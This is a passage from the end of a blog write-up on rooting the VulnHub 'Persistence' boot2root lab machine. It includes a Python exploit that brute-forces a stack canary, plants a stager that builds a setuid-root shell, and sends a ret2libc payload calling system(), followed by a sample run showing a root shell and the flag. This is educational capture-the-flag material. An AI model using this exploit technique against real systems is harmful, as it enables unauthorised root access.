            print <span style=color:#e6db74>&#34;[+] Found a possible canary value of &#39;</span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>&#39;!&#34;</span><span style=color:#f92672>.</span>format(hex_byte<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;hex&#34;</span>))
            canary <span style=color:#f92672>+=</span> hex_byte
            sock<span style=color:#f92672>.</span>close()
            <span style=color:#66d9ef>break</span>

        sock<span style=color:#f92672>.</span>close()
    <span style=color:#75715e># if we cant even find the first byte, we failed already</span>
    <span style=color:#66d9ef>if</span> len(canary) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>:
        print <span style=color:#e6db74>&#34;[-] Unable to even find the first bit of the canary. No luck&#34;</span>
        sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)

<span style=color:#75715e># The canary is our ticket out of here!</span>
<span style=color:#66d9ef>if</span> len(canary) <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span>:

    print <span style=color:#e6db74>&#34;[+] Canary known as : </span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(canary<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;hex&#34;</span>))
    print <span style=color:#e6db74>&#34;[+] Writing /tmp/log to be called by wopr later&#34;</span>

    <span style=color:#75715e># ./wopr has the string /tmp/log in it. We will use this as</span>
    <span style=color:#75715e># our code exec point, overwriting whatever is in it atm</span>
    stager <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span><span style=color:#e6db74>        #!/bin/sh
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>        # First, prepare a small C shell and move it to /tmp with name getroot
</span><span style=color:#e6db74>        echo &#34;int main(void)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>{</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>setuid(0);</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>system(</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;/bin/sh</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;);</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>return 0;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>}&#34; &gt; /tmp/getroot.c
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>        # compile it
</span><span style=color:#e6db74>        /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>        # change ownership and setuid
</span><span style=color:#e6db74>        /bin/chown root:root /tmp/getroot
</span><span style=color:#e6db74>        /bin/chmod 4777 /tmp/getroot
</span><span style=color:#e6db74>    &#34;&#34;&#34;</span>

    <span style=color:#75715e># write the file</span>
    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;/tmp/log&#39;</span>,<span style=color:#e6db74>&#39;w&#39;</span>) <span style=color:#66d9ef>as</span> stager_file:
        stager_file<span style=color:#f92672>.</span>write(stager)

    <span style=color:#75715e># make it executable</span>
    os<span style=color:#f92672>.</span>chmod(<span style=color:#e6db74>&#39;/tmp/log&#39;</span>, <span style=color:#ae81ff>0755</span>)

    <span style=color:#75715e># now, with the stack canary known and the stager ready, lets corrupt</span>
    <span style=color:#75715e># EIP and sploit!</span>
    payload <span style=color:#f92672>+=</span> canary               <span style=color:#75715e># canary we bruted</span>
    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span>              <span style=color:#75715e># padding to EIP wich is at byte 42</span>
    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x10\x62\xe5\xb7</span><span style=color:#e6db74>&#34;</span>   <span style=color:#75715e># system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.</span>
    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;JUNK&#34;</span>               <span style=color:#75715e># JUNK. Should probably do exit() here. Meh.</span>
    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x60\x8c\x04\x08</span><span style=color:#e6db74>&#34;</span>   <span style=color:#75715e># location if /tmp/log string in .data</span>

    <span style=color:#75715e># and connect &amp;&amp; send</span>
    print <span style=color:#e6db74>&#34;[+] Connecting to service&#34;</span>
    sock <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
    sock<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#ae81ff>3333</span>))
    sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>35</span>)
    sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>40</span>)
    sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>5</span>)
    print <span style=color:#e6db74>&#34;[+] Sending Payload&#34;</span>
    sock<span style=color:#f92672>.</span>send(payload)

    sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>64</span>)
    sock<span style=color:#f92672>.</span>close()
    print <span style=color:#e6db74>&#34;[+] Done&#34;</span>

    print <span style=color:#e6db74>&#34;[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)&#34;</span>
    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;/tmp/getroot&#34;</span>)

<span style=color:#66d9ef>else</span>:
    print <span style=color:#e6db74>&#34;[!] Incomplete Canary. Can&#39;t continue reliably&#34;</span>

<span style=color:#75715e># done</span>
</code></pre></div><p>A sample run would be:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bash-4.1$ ls -lah /tmp/sploit.py
-rw-rw-r--. <span style=color:#ae81ff>1</span> avida avida 4.0K Sep <span style=color:#ae81ff>18</span> 10:33 /tmp/sploit.py
bash-4.1$ python /tmp/sploit.py

            A: <span style=color:#e6db74>&#34;So, I heard you like pain...?&#34;</span>
            B: <span style=color:#e6db74>&#34;... a bit&#34;</span>
            C: <span style=color:#e6db74>&#34;Well, here it is, the: &#34;</span>
 ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
|    <span style=color:#ae81ff>\ </span>/  _<span style=color:#f92672>]</span>|    <span style=color:#ae81ff>\ </span> / ___/|    / ___/|      |  /  _<span style=color:#f92672>]</span>|    <span style=color:#ae81ff>\ </span>  /  <span style=color:#f92672>]</span>  /  _<span style=color:#f92672>]</span>
|  o  <span style=color:#f92672>)</span>  <span style=color:#f92672>[</span>_ |  D  <span style=color:#f92672>)(</span>   <span style=color:#ae81ff>\_</span>  |  <span style=color:#f92672>(</span>   <span style=color:#ae81ff>\_</span> |      | /  <span style=color:#f92672>[</span>_ |  _  | /  /  /  <span style=color:#f92672>[</span>_
|   _/    _<span style=color:#f92672>]</span>|    /  <span style=color:#ae81ff>\_</span>_  | |  |<span style=color:#ae81ff>\_</span>_  <span style=color:#f92672>||</span>_|  |_<span style=color:#f92672>||</span>    _<span style=color:#f92672>]</span>|  |  |/  /  |    _<span style=color:#f92672>]</span>
|  | |   <span style=color:#f92672>[</span>_ |    <span style=color:#ae81ff>\ </span> /  <span style=color:#ae81ff>\ </span>| |  |/  <span style=color:#ae81ff>\ </span>|  |  |  |   <span style=color:#f92672>[</span>_ |  |  /   <span style=color:#ae81ff>\_</span> |   <span style=color:#f92672>[</span>_
|  | |     <span style=color:#f92672>||</span>  .  <span style=color:#ae81ff>\ \ </span>   | |  |<span style=color:#ae81ff>\ </span>   |  |  |  |     <span style=color:#f92672>||</span>  |  <span style=color:#ae81ff>\ </span>    <span style=color:#f92672>||</span>     |
|__| |_____<span style=color:#f92672>||</span>__|<span style=color:#ae81ff>\_</span>|  <span style=color:#ae81ff>\_</span>__<span style=color:#f92672>||</span>____|<span style=color:#ae81ff>\_</span>__|  |__|  |_____<span style=color:#f92672>||</span>__|__|<span style=color:#ae81ff>\_</span>___<span style=color:#f92672>||</span>_____|
      _____ ____  _       ___  ____  ______
     / ___/|    <span style=color:#ae81ff>\|</span> |     /   <span style=color:#ae81ff>\|</span>    <span style=color:#f92672>||</span>      |
    <span style=color:#f92672>(</span>   <span style=color:#ae81ff>\_</span> |  o  <span style=color:#f92672>)</span> |    |     <span style=color:#f92672>||</span>  | |      |
     <span style=color:#ae81ff>\_</span>_  <span style=color:#f92672>||</span>   _/| |___ |  O  <span style=color:#f92672>||</span>  | |_|  |_|
     /  <span style=color:#ae81ff>\ </span><span style=color:#f92672>||</span>  |  |     <span style=color:#f92672>||</span>     <span style=color:#f92672>||</span>  |   |  |
     <span style=color:#ae81ff>\ </span>   <span style=color:#f92672>||</span>  |  |     <span style=color:#f92672>||</span>     <span style=color:#f92672>||</span>  |   |  |
      <span style=color:#ae81ff>\_</span>__<span style=color:#f92672>||</span>__|  |_____| <span style=color:#ae81ff>\_</span>__/|____|  |__|

                A: <span style=color:#e6db74>&#34;AKA: FU superkojiman &amp;&amp; sagi- !!&#34;</span>
                A: <span style=color:#e6db74>&#34;I also have no idea what I am doing&#34;</span>

<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Connecting &amp; starting canary bruteforce...
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Found a possible canary value of <span style=color:#e6db74>&#39;64&#39;</span>!
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Found a possible canary value of <span style=color:#e6db74>&#39;d3&#39;</span>!
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Found a possible canary value of <span style=color:#e6db74>&#39;c6&#39;</span>!
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Found a possible canary value of <span style=color:#e6db74>&#39;15&#39;</span>!
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Canary known as : 64d3c615
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Writing /tmp/log to be called by wopr later
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Connecting to service
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Sending Payload
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Done
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> going to try and spawn /tmp/getroot, assuming the sploit worked :<span style=color:#f92672>)</span>
sh-4.1# id
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>500<span style=color:#f92672>(</span>avida<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,500<span style=color:#f92672>(</span>avida<span style=color:#f92672>)</span> context<span style=color:#f92672>=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</code></pre></div><p>And, as proof, we cat the flag!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sh-4.1# cat /root/flag.txt
              .d8888b.  .d8888b. <span style=color:#ae81ff>888</span>
             d88P  Y88bd88P  Y88b888
             <span style=color:#ae81ff>888</span>    <span style=color:#ae81ff>888888</span>    <span style=color:#ae81ff>888888</span>
<span style=color:#ae81ff>888</span>  <span style=color:#ae81ff>888</span>  <span style=color:#ae81ff>888888</span>    <span style=color:#ae81ff>888888</span>    <span style=color:#ae81ff>888888888</span>
<span style=color:#ae81ff>888</span>  <span style=color:#ae81ff>888</span>  <span style=color:#ae81ff>888888</span>    <span style=color:#ae81ff>888888</span>    <span style=color:#ae81ff>888888</span>
<span style=color:#ae81ff>888</span>  <span style=color:#ae81ff>888</span>  <span style=color:#ae81ff>888888</span>    <span style=color:#ae81ff>888888</span>    <span style=color:#ae81ff>888888</span>
Y88b <span style=color:#ae81ff>888</span> d88PY88b  d88PY88b  d88PY88b.
 <span style=color:#e6db74>&#34;Y8888888P&#34;</span>  <span style=color:#e6db74>&#34;Y8888P&#34;</span>  <span style=color:#e6db74>&#34;Y8888P&#34;</span>  <span style=color:#e6db74>&#34;Y888
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>Congratulations!!! You have the flag!
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>We had a great time coming up with the
</span><span style=color:#e6db74>challenges for this boot2root, and we
</span><span style=color:#e6db74>hope that you enjoyed overcoming them.
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>Special thanks goes out to @VulnHub for
</span><span style=color:#e6db74>hosting Persistence for us, and to
</span><span style=color:#e6db74>@recrudesce for testing and providing
</span><span style=color:#e6db74>valuable feedback!
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>Until next time,
</span><span style=color:#e6db74>      sagi- &amp; superkojiman
</span></code></pre></div><h2 id=conclusion>conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2>
<p>Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- && superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!</p>
<h2 id=thats-not-all>thats not all<a hidden class=anchor aria-hidden=true href=#thats-not-all>#</a></h2>
<p>There are however a few more things I&rsquo;d like to try.</p>
<ul>
<li>Find if and how we can root Persistence using <code>sysadmin-tool</code></li>
<li>Modify the exploit to a working ROP payload</li>
<li>Explore other avenues to break out of rbash</li>
</ul>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/>
<span class=title>« Prev Page</span>
<br>
<span>another troll tamed solving troll 2</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2014/08/17/kali-linux-oracle-support/>
<span class=title>Next Page »</span>
<br>
<span>Kali Linux Oracle Support</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share From Persistence on twitter" href="https://twitter.com/intent/tweet/?text=From%20Persistence&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f09%2f18%2ffrom-persistence%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share From Persistence on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f09%2f18%2ffrom-persistence%2f&title=From%20Persistence&summary=From%20Persistence&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f09%2f18%2ffrom-persistence%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share From Persistence on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f09%2f18%2ffrom-persistence%2f&title=From%20Persistence"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share From Persistence on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f09%2f18%2ffrom-persistence%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share From Persistence on whatsapp" href="https://api.whatsapp.com/send?text=From%20Persistence%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f09%2f18%2ffrom-persistence%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share From Persistence on telegram" href="https://telegram.me/share/url?text=From%20Persistence&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f09%2f18%2ffrom-persistence%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>